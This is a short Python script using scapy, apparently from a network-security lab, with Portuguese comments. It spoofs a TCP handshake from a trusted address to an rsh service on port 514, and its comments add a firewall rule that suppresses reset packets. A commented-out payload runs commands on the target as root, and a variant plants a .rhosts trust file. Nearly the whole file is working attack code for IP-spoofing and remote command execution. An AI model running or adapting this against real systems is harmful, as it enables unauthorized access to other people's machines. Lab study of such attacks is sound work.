#!/usr/bin/python3

import scapy.all as scapy
from arpspoof import get_iface

#iptables -F
#iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

# apt update
# apt install ufw -y
# ufw enable

print("-----------------Manda pacote SYN-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='S', seq=100)
# pkt.show()
rcvd = scapy.sr1(pkt, iface=get_iface(), verbose=False)
# rcvd.show()

print("-----------------Manda pacote ACK-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='A', seq=101, ack=rcvd.seq + 1)
# pkt.show()
scapy.send(pkt, verbose=False)

# ## CONEXAO ABERTA!!!!
# print("-----------------Manda pacote RSH-----------------")
# # data = 'echo "aaa" > $HOME/.rhosts'
# data = '9090\x00root\x00root\x00touch /tmp/xyz\x00'
# pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='A', seq=102, ack=rcvd.seq + 1) / scapy.Raw(load=data)
# # scapy.send(pkt, verbose=False)
# rcvd = scapy.sr1(pkt, iface=get_iface(), verbose=False)